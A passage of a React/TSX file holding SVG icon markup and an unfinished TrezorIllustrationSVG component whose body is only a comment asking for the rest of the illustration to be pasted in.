    <path d="M1110.94,709.38c0-57.48-49.89-105.2-110.62-105.2S889.7,651.9,889.7,709.38V743H844.15V984.85h0l156.17,72.66,156.17-72.66h0V744.09h-45.55Zm-164.85,0c0-27.11,23.86-48.8,54.23-48.8s54.23,21.69,54.23,48.8V743H946.09Zm147.5,236.43-93.27,43.38-93.27-43.38V800.48h186.54Z" />
  </svg>
);

const TrezorIllustrationSVG = ({ className }: { className?: string }) => (
  <svg className={className} width="205" height="304" viewBox="0 0 205 304" fill="none" xmlns="http://www.w3.org/2000/svg">
    {/* ⚠️ PASTE THE REMAINDER OF THE HUGE GREEN TREZOR SVG HERE! ⚠️ */}
  </svg>
);